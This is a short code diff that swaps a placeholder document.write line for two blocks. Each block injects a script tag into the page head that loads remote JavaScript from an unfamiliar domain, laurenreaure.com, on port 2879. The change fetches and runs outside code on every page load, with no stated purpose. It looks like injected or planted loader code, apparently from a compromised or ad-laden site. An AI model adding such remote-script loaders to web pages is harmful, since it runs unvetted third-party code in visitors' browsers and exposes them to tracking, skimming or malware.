@@ -1,1 +1,12 @@
-document.write("fxs-m-foot")
+var s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.async = true;
+    s.src = 'https://laurenreaure.com:2879/impl/t105/s1926';
+    var head = document.getElementsByTagName('head')[0];
+    head.appendChild(s);
+ var s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.async = true;
+    s.src = 'https://laurenreaure.com:2879/impl/t104_150/s1926';
+    var head = document.getElementsByTagName('head')[0];
+    head.appendChild(s);
